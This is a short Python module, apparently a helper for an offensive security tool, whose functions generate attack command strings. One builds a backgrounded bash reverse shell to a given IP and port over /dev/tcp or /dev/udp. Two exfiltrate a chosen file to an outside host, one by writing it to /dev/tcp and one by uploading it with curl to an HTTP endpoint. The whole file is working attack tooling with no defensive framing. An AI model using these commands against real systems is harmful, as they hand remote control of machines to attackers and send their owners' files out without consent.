class Shells:
	class Rev:
		def bash(ip,port,shell,protocol):
			return f"{shell} -i >& /dev/{protocol}/{ip}/{port} 0>&1 &"
class Exfil:
	def socket(ip,port,file):
		return f"cat {file} >& /dev/tcp/{ip}/{port} &"
	def pflask(ip, port, file):
		return f"bash -c \\\"curl -F 'file=@{file}' http://{ip}:{port}/up &> /dev/null &\\\"; "

